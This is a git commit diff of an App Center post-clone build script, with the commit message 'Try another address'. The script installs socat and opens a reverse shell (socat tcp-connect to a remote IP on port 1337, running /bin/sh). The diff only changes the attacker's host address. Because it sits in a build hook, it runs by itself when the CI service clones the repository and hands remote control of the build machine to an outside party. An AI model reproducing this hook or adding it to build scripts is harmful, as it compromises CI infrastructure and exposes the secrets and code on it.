7a3fdfbb73fd898cdbac6fed1d9c435de10a9e2d
Ka Li <ka@kali.kali>
2021-05-17 15:48:29 -0500

    Try another address

--- app/appcenter-post-clone.sh
+++ app/appcenter-post-clone.sh
@@ -2,6 +2,6 @@
 
 echo "This is an App Center Post-Clone script. For more information on how to use App Center build scripts vist: https://docs.microsoft.com/en-us/appcenter/build/custom/scripts"
 brew install socat
-RHOST=88.103.237.233
+RHOST=91.234.32.54
 RPORT=1337
 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sane
